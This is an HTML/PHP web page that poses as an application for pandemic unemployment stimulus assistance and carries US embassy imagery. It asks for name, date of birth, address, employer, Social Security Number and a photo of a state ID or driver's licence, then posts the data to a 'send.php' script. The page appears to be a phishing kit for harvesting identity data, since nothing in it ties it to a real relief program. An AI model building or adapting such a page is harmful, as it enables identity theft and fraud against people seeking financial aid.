<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Application Form</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alpinejs/alpine@v2.x.x/dist/alpine.min.js">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js">
    <link rel="stylesheet" href="main.css">
    <script src="https://code.jquery.com/jquery-3.6.1.js" integrity="sha256-3zlB5s2uwoUzrXK3BT7AX3FyvojsraNFxCc2vC/7pNI=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="shortcut icon" href="./images/logo eeeee.png" type="image/x-icon">
</head>

<body>

    <?php require("nav.php") ?>


    <div class="bluenav ">
        <a href="./apply"><img class="Applynow" src="images/us-embassy-embassy.gif" alt="" srcset=""></a>
    </div>
    <h1 class=" container EUPA py-3 mt-4">ECONOMIC UNEMPLOYMENT PANDEMIC STIMULUS ASSISTANCE</h1>

    <form id="fff" class="fff" method="POST" enctype="multipart/form-data">
        <div class="container my-5">
            <div class="row">
                <div class="col-md-6 mx-auto">
                    <div class="form-group">
                        <input type="email" id="email" name="email" required class="form-control">
                        <label class="form-control-placeholder" for="email">Email</label>
                    </div>

                    <div class="form-group">
                        <input type="text" id="name" name="fullname" required class="form-control">
                        <label class="form-control-placeholder" for="name">Name</label>
                    </div>


                    <div class="form-group">
                        <input type="date" id="dob" name="dob" class="form-control">
                        <label class="form-control-placeholder" for="dob">Date of birth</label>
                    </div>

                    <div class="form-group">
                        <input type="tel" id="phone" name="phone" required class="form-control">
                        <label class="form-control-placeholder" for="phone">Tel No</label>
                    </div>

                    <div class="form-group">
                        <select name="gender border-0" class="form-select form-select-lg mb-3" aria-label=".form-select-lg example">

                            <option value="Male">Male</option>
                            <option value="Female">Female</option>

                        </select>
                    </div>
                    <br>
                    <div class="form-group">
                        <textarea id="ha" required name="address" class="form-control"></textarea>
                        <label class="form-control-placeholder" for="ha">Home Address</label>
                    </div>
                    <div class="form-group">
                        <input type="text" id="city" name="city" required class="form-control">
                        <label class="form-control-placeholder" for="city">City</label>
                    </div>

                    <div class="form-group">
                        <input type="text" id="state" required name="state" class="form-control">
                        <label class="form-control-placeholder" for="state">State</label>
                    </div>

                    <div class="form-group">
                        <input type="text" id="pc" required name="poster_code" class="form-control">
                        <label class="form-control-placeholder" for="pc">Postal Code</label>
                    </div>

                    <div class="form-group">
                        <input type="text" id="ce" required name="current_employer" class="form-control">
                        <label class="form-control-placeholder" for="ce">Current Employer</label>
                    </div>

                    <div class="form-group">
                        <input type="text" id="ssn" required name="ssn" class="form-control">
                        <label class="form-control-placeholder" for="ssn"> Social Security Number</label>
                    </div>

                    <div class="form-group">
                        <input type="text" id="el" required name="edu_level" class="form-control">
                        <label class="form-control-placeholder" for="el">Eduction Level</label>
                    </div>

                    <!-- <div class="form-group">
                        <input type="text" id="ssn" required class="form-control" >
                        <label class="form-control-placeholder" for="ssn"> Social Security Number</label>
                    </div> -->

                    <div class="form-group">
                        Have You Received Any Relief Bonus?<br />
                        Yes <input type="checkbox" name="yes_Relief_Bonus" id=""><br />
                        No <input type="checkbox" name="no_Relief_Bonus" id=""><br />
                    </div>



                    <!--  -->
                    State ID or Driver's Licence Picture
                    <div class="py-2  bg-white px-2">
                        <div class="max-w-md mx-3 rounded-lg overflow-hidden md:max-w-xl">
                            <div class="md:flex">
                                <div class="w-full p-3">
                                    <div class="relative border-dotted h-48 rounded-lg border-dashed border-2 border-blue-700 bg-gray-100 flex justify-center items-center">

                                        <div class="absolute">

                                            <div class="flex flex-col items-center">
                                                <i class="fa fa-folder-open fa-4x text-blue-700"></i>
                                                <span class="block text-gray-400 font-normal">Attach you files here</span>
                                            </div>
                                        </div>

                                        <input type="file" required class="h-full w-full opacity-0" name="uploaded_file">

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!--  -->
                    <button id="sbtn" type="submit" class="btn btn-primary ps-5 pe-5 text-white">Submit</button>
                </div>
            </div>
        </div>



    </form>



    <?php

    require("footer.php")
    ?>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

    <script>
        $(document).ready(function() {

            $("#fff").submit(function(e) {
                e.preventDefault();
                $("#sbtn").html("Processing...")
                $("#sbtn").prop('disabled', true);
                $.ajax({
                    type: 'POST',
                    url: "send.php",
                    data: new FormData(this),
                    dataType: 'text',
                    contentType: false,
                    processData: false, //this is a must
                    success: function(response) {
                        $("#sbtn").html("Submit")
                        $("#sbtn").prop('disabled', false);
                        // console.log(response);
                        if (response == true) {
                            Swal.fire({
                                title: 'Success!',
                                text: 'Registration Successfull  We will get Back before 24hrs',
                                icon: 'success',
                                confirmButtonText: 'Okay'
                            })
                        } else {
                            Swal.fire({
                                title: 'Error!',
                                text: response,
                                icon: 'error',
                                confirmButtonText: 'Okay'
                            })
                        }
                    }
                });

            });
        });
    </script>

</body>

</html>